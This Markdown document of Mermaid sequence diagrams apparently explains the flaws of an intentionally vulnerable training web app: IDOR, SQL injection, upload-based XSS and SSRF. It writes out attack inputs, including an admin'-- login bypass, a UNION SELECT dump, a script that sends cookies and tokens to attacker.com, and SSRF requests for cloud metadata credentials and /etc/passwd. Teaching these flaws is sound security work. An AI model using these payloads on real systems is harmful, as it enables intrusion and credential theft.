# Message Sequence Diagrams

## 1. User Registration Sequence

[User Registration Sequence Diagram](./static/User%20Registration%20Sequence.png)

```mermaid
sequenceDiagram
    actor User
    participant Browser
    participant React as React App<br/>/wcorp/register
    participant API as Express API<br/>/api/register
    participant DB as MySQL Database
    
    User->>Browser: Navigate to /wcorp/register
    Browser->>React: Load registration page
    React-->>Browser: Display form
    
    User->>Browser: Enter username, email, password
    User->>Browser: Click "Register"
    
    Browser->>React: Submit form
    React->>React: Validate input (client-side)
    
    alt Valid Input
        React->>API: POST /api/register<br/>{username, email, password, role?}
        
        Note over API: ⚠️ VULNERABILITY: A03<br/>Parameter Tampering<br/>Accepts "role" from client!
        
        API->>API: Extract data from request body
        API->>DB: SELECT * FROM users<br/>WHERE username = ? OR email = ?
        DB-->>API: Existing users
        
        alt User Already Exists
            API-->>React: {success: false, message: "User exists"}
            React-->>Browser: Show error
            Browser-->>User: "Username or email already exists"
        else User Doesn't Exist
            API->>API: Prepare INSERT query
            
            Note over API: ⚠️ VULNERABILITY: A02<br/>Plain text password!<br/>No hashing or encryption
            
            API->>DB: INSERT INTO users<br/>(username, email, password, role)<br/>VALUES (?, ?, ?, ?)
            DB-->>API: {insertId: userId}
            API-->>React: {success: true, userId}
            React-->>Browser: Show success message
            Browser-->>User: "Registration successful!"
            
            React->>React: Redirect after 2 seconds
            React->>Browser: Navigate to /wcorp/login
        end
    else Invalid Input
        React-->>Browser: Show validation errors
        Browser-->>User: "Please fix errors"
    end
```

## 2. Login & Authentication Sequence

[Login and Auth Sequence](./static/Login%20and%20Auth%20Seq.png)

## 3. IDOR Attack Sequence

[IDOR Attack Sequence](./static/IDOR%20Seq.png)

```mermaid
sequenceDiagram
    actor Attacker
    participant Browser
    participant React as React App
    participant API as Express API<br/>/api/user/profile/:id
    participant AuthMW as Auth Middleware
    participant DB as MySQL Database
    
    Note over Attacker: Attacker is logged in as User ID 5
    
    Attacker->>Browser: Navigate to /wcorp/portal/profile/5
    Browser->>React: Load UserProfile component
    React->>React: Extract ID from URL (id=5)
    React->>API: GET /api/user/profile/5<br/>Authorization: Bearer {token}
    
    API->>AuthMW: Validate token
    AuthMW->>AuthMW: Decode token
    AuthMW->>AuthMW: Extract userId (5) from token
    
    alt Token Valid
        AuthMW-->>API: Token valid, userId=5
        
        Note over API: ⚠️ VULNERABILITY: A01 IDOR<br/>No authorization check!<br/>Doesn't verify userId === id
        
        API->>DB: SELECT * FROM users<br/>WHERE id = 5
        DB-->>API: User 5 data
        API-->>React: {success: true, user: {...}}
        React-->>Browser: Display user data
        Browser-->>Attacker: Shows own profile
        
        Note over Attacker: Attacker manually changes URL
        
        Attacker->>Browser: Change URL to /wcorp/portal/profile/1
        Browser->>React: Load UserProfile with id=1
        React->>API: GET /api/user/profile/1<br/>Authorization: Bearer {token}
        
        API->>AuthMW: Validate token
        AuthMW-->>API: Token valid, userId=5
        
        Note over API: ⚠️ CRITICAL: Still no check!<br/>API returns ANY user's data
        
        API->>DB: SELECT * FROM users<br/>WHERE id = 1
        DB-->>API: Admin user data
        API-->>React: {success: true, user: {admin data}}
        React-->>Browser: Display admin data
        Browser-->>Attacker: 🚨 Admin profile exposed!
        
        Note over Attacker: Attacker automates enumeration
        
        loop For each ID from 1 to 100
            Attacker->>API: GET /api/user/profile/{id}
            API->>DB: SELECT * FROM users WHERE id = {id}
            DB-->>API: User data
            API-->>Attacker: User data
        end
        
        Note over Attacker: 💀 All user data stolen
        
    else Token Invalid
        AuthMW-->>API: 401 Unauthorized
        API-->>React: 401 Unauthorized
        React->>Browser: Redirect to /wcorp/login
    end
```

## 4. SQL Injection Attack Sequence

[SQL Injection Attack Sequence](./static/Sql%20Injection%20Seq.png)

```mermaid
sequenceDiagram
    actor Attacker
    participant Tool as curl/Burp Suite
    participant API as Express API<br/>/api/legacy-login
    participant DB as MySQL Database
    
    Attacker->>Tool: Craft SQL injection payload
    Tool->>Tool: Prepare request:<br/>username: "admin'-- "<br/>password: "anything"
    
    Tool->>API: POST /api/legacy-login<br/>{username: "admin'-- ",<br/>password: "anything"}
    
    API->>API: Extract username and password
    API->>API: Build SQL query
    
    Note over API: ⚠️ CRITICAL VULNERABILITY: A03<br/>String concatenation!<br/>const sql = `SELECT * FROM users<br/>WHERE username = '${username}'<br/>AND password = '${password}'`
    
    API->>API: Final query becomes:<br/>SELECT * FROM users<br/>WHERE username = 'admin'-- '<br/>AND password = 'anything'
    
    Note over API: Everything after -- is a comment!<br/>Password check is ignored!
    
    API->>DB: Execute malicious query
    DB->>DB: Parse SQL
    DB->>DB: "admin" username found
    DB->>DB: Password check commented out
    DB-->>API: Return admin user record
    
    API->>API: Generate token for admin
    API->>DB: INSERT INTO sessions (user_id, token)
    DB-->>API: Success
    
    API-->>Tool: {success: true,<br/>user: {id: 1, username: "admin", role: "admin"},<br/>token: "admin_token"}
    
    Tool-->>Attacker: 🚨 Admin access obtained!
    
    Note over Attacker: Attacker escalates to data extraction
    
    Attacker->>Tool: Craft UNION SELECT payload
    Tool->>Tool: Prepare:<br/>query: "' UNION SELECT * FROM users-- "
    
    Tool->>API: POST /api/search<br/>{query: "' UNION SELECT * FROM users-- "}
    
    API->>API: Build query:<br/>SELECT * FROM users<br/>WHERE username LIKE '%' UNION SELECT * FROM users-- %'
    
    API->>DB: Execute malicious query
    DB->>DB: Execute SELECT * FROM users
    DB-->>API: ALL user records with passwords!
    
    API-->>Tool: {success: true,<br/>results: [{id: 1, password: "admin123"}, ...]}
    
    Tool-->>Attacker: 💀 Complete database dump!
```

## 5. File Upload & XSS Attack Sequence

[File Upload & XSS Attack Sequence](./static/File%20Upload%20&%20XSS%20Attack%20Sequence.png)

```mermaid
sequenceDiagram
    actor Attacker
    participant Browser as Attacker's Browser
    participant React as React App<br/>/wcorp/portal
    participant API as Express API<br/>/api/upload
    participant AuthMW as Auth Middleware
    participant Multer
    participant FS as File System
    participant DB as MySQL Database
    
    participant VBrowser as Victim's Browser
    actor Victim
    
    Attacker->>Browser: Create malicious HTML file
    
    Note over Browser: File: steal-cookies.html<br/><script><br/>fetch('https://attacker.com/steal',<br/>{credentials: document.cookie})<br/></script>
    
    Attacker->>Browser: Navigate to /wcorp/portal
    Browser->>React: Load user portal
    React-->>Browser: Show file upload form
    
    Attacker->>Browser: Select malicious file
    Attacker->>Browser: Click "Upload"
    
    Browser->>React: Submit file
    React->>API: POST /api/upload<br/>multipart/form-data<br/>Authorization: Bearer {token}
    
    API->>AuthMW: Validate token
    AuthMW-->>API: Token valid
    
    API->>Multer: Process multipart data
    Multer->>Multer: Parse file
    
    Note over Multer: ⚠️ VULNERABILITY: A08<br/>NO file type validation!<br/>NO size limit!<br/>NO content scanning!
    
    Multer->>FS: Save to /uploads/<br/>steal-cookies.html
    FS-->>Multer: File saved
    
    Multer->>DB: INSERT INTO files<br/>(user_id, filename, file_path)
    DB-->>Multer: Success
    
    Multer-->>API: Upload complete
    API-->>React: {success: true,<br/>filename: "steal-cookies.html",<br/>url: "/uploads/steal-cookies.html"}
    
    React-->>Browser: "File uploaded successfully!"
    Browser-->>Attacker: Get file URL
    
    Note over Attacker: Attacker shares link with victim
    
    Attacker->>Victim: Send phishing message<br/>"Check out this document:<br/>http://wcorp.com/uploads/steal-cookies.html"
    
    Victim->>VBrowser: Click link
    VBrowser->>FS: GET /uploads/steal-cookies.html
    FS-->>VBrowser: Return HTML file
    
    VBrowser->>VBrowser: Parse HTML
    VBrowser->>VBrowser: Execute <script> tag
    
    Note over VBrowser: 🚨 XSS payload executes!
    
    VBrowser->>VBrowser: Access document.cookie
    VBrowser->>VBrowser: Access localStorage
    
    VBrowser->>Attacker: fetch('https://attacker.com/steal',<br/>{cookie: document.cookie,<br/>token: localStorage.getItem('token')})
    
    Attacker->>Attacker: Receive stolen credentials
    Attacker->>Browser: Use stolen token
    Browser->>API: Requests with victim's token
    
    Note over Attacker: 💀 Victim's account compromised!
```

## 6. SSRF Attack Sequence

[SSRF Attack Sequence](./static/SSRF%20seq.png)

```mermaid
sequenceDiagram
    actor Attacker
    participant Browser
    participant React as React App
    participant API as Express API<br/>/api/fetch-url
    participant Server as Node.js Server
    participant Internal as Internal Resources
    participant Cloud as Cloud Metadata API
    participant FS as File System
    
    Attacker->>Browser: Open DevTools console
    Attacker->>Browser: Discover SSRF endpoint
    
    Note over Attacker: Test basic functionality first
    
    Attacker->>Browser: fetch('/api/fetch-url?url=http://example.com')
    Browser->>API: GET /api/fetch-url?url=http://example.com
    
    API->>API: Parse URL parameter
    
    Note over API: ⚠️ VULNERABILITY: A10 SSRF<br/>NO URL validation!<br/>NO allowlist!<br/>NO protocol restrictions!
    
    API->>Server: fetch(url)
    Server->>Server: Request http://example.com
    Server-->>API: Response from example.com
    API-->>Browser: Return response
    Browser-->>Attacker: Works! SSRF confirmed
    
    Note over Attacker: Escalate to internal access
    
    Attacker->>Browser: fetch('/api/fetch-url?url=http://localhost:3000/.env')
    Browser->>API: GET /api/fetch-url?url=http://localhost:3000/.env
    
    API->>Server: fetch('http://localhost:3000/.env')
    Server->>Internal: Request /.env
    Internal-->>Server: Return .env file contents
    Server-->>API: .env file data
    API-->>Browser: Return .env contents
    
    Browser-->>Attacker: 🚨 Environment variables exposed!
    
    Note over Attacker: DB_PASSWORD=xxx<br/>JWT_SECRET=yyy<br/>MYSQL_ROOT_PASSWORD=zzz
    
    Note over Attacker: Access cloud metadata
    
    Attacker->>Browser: fetch('/api/fetch-url?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/')
    Browser->>API: GET /api/fetch-url?url=...
    
    API->>Server: fetch(cloud metadata URL)
    Server->>Cloud: Request IAM credentials
    Cloud-->>Server: AWS access keys
    Server-->>API: Cloud credentials
    API-->>Browser: Return credentials
    
    Browser-->>Attacker: 💀 Cloud account compromise!
    
    Note over Attacker: Try file:// protocol
    
    Attacker->>Browser: fetch('/api/fetch-url?url=file:///etc/passwd')
    Browser->>API: GET /api/fetch-url?url=file:///etc/passwd
    
    API->>Server: fetch('file:///etc/passwd')
    Server->>FS: Read /etc/passwd
    FS-->>Server: System users file
    Server-->>API: File contents
    API-->>Browser: Return file
    
    Browser-->>Attacker: System files accessed!
    
    Note over Attacker: Scan internal network
    
    loop For each internal IP
        Attacker->>API: /api/fetch-url?url=http://192.168.1.{i}
        API->>Server: fetch internal IP
        Server-->>API: Response or timeout
        API-->>Attacker: Map internal network
    end
    
    Note over Attacker: Complete internal network mapped
```

## Summary

These sequence diagrams show:

1. **Registration**: Parameter tampering and plain text password storage
2. **Login**: Predictable token generation and client-side storage vulnerabilities
3. **IDOR**: Missing authorization checks enabling data enumeration
4. **SQL Injection**: String concatenation leading to authentication bypass
5. **File Upload & XSS**: Unrestricted upload leading to XSS and account takeover
6. **SSRF**: Missing URL validation enabling internal access and data exfiltration

### Attack Complexity

| Attack Type | Steps Required | Skill Level | Impact |
|-------------|----------------|-------------|--------|
| IDOR | 3-5 | Beginner | High |
| SQL Injection | 2-3 | Beginner | Critical |
| File Upload XSS | 5-7 | Intermediate | Critical |
| SSRF | 3-4 | Intermediate | Critical |
| Token Prediction | 5-8 | Advanced | High |

